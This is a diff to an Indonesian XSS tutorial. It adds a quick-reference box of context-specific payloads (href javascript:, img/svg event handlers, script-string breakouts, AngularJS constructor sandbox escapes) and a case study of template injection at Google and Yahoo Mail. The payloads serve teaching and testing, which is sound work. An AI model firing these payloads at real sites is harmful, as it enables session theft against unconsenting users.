@@ -1,5 +1,20 @@
 # Cross-Site Scripting (XSS): Vektor Tag Link, Gambar, Page Script, & Sandbox Bypass AngularJS
 
+> [!TIP]
+> ### ⚡ Cara Cepat / Quick Solution (Langsung Praktik)
+> Gunakan payload langsung sesuai titik injeksi HTML yang rentan:
+> - **Atribut Link (`href`):** `javascript:alert(1)`
+> - **Tag Gambar / Event Handler:** `<img src=x onerror=alert(1)>` atau `<svg onload=alert(1)>`
+> - **Dalam Tag Script:** `';alert(1)//` atau `-alert(1)-`
+> - **AngularJS Sandbox Escape:**
+>   ```javascript
+>   {{$on.constructor('alert(1)')()}}
+>   // atau variasi universal:
+>   {{constructor.constructor('alert(1)')()}}
+>   ```
+
+---
+
 Dalam dunia keamanan aplikasi web, **Cross-Site Scripting (XSS)** secara konsisten menduduki peringkat teratas kerentanan paling sering ditemukan. Celah ini memungkinkan penyerang **mengeksekusi kode JavaScript berbahaya di dalam peramban korban** dalam konteks asal (*origin*) situs yang sah.
 
 Namun, banyak pemula terjebak hanya menggunakan payload klasik `<script>alert(1)</script>` dan gagal ketika payload tersebut diblokir atau tidak cocok dengan konteks output. 
@@ -195,6 +210,18 @@ Buka **Inspect Element** (atau cari respons di Burp Repeater) dan temukan di man
 3. Begitu dialog pop-up `alert(document.domain)` muncul di layar, celah XSS terbukti valid (*PoC confirmed*)! 🎉
 
 ---
+
+## 🌍 Studi Kasus Nyata di Industri (Real-World Case Study)
+
+### Client-Side Template Injection (CSTI) di Subdomain Google & Yahoo Mail
+Kerentanan AngularJS Sandbox Escape membuktikan bahwa escaping karakter HTML standar tidak selalu cukup:
+* **Asumsi Keliru Pengembang:** Tim developer di Google dan Yahoo Mail menyaring karakter `<script>` dan atribut event handler HTML menjadi teks biasa (`&lt;script&gt;`). Mereka menganggap aman mencetak input pengguna ke dalam halaman web.
+* **Eksekusi Ekspresi AngularJS:** Namun, karena halaman tersebut memuat framework frontend AngularJS (`ng-app`), penyerang menyisipkan ekspresi matematis dan constructor escape seperti:
+  ```javascript
+  {{$on.constructor('alert(document.cookie)')()}}
+  ```
+  Parser AngularJS di browser membaca tanda kurung kurawal ganda `{{...}}` dan mengeksekusi kode JavaScript tersebut secara langsung di memori browser korban!
+* **Dampak Industri:** Rangkaian temuan ini memicu puluhan laporan bug bounty berhadiah **$3.133,70 – $10.000 USD** pada Google Vulnerability Reward Program (VRP), hingga akhirnya tim inti AngularJS memutuskan mematikan fitur sandbox karena terbukti tidak mungkin membuat sandbox klien yang 100% kedap celah.
 
 ## 4. Bedah Kode Backend: Rentan vs Aman
 
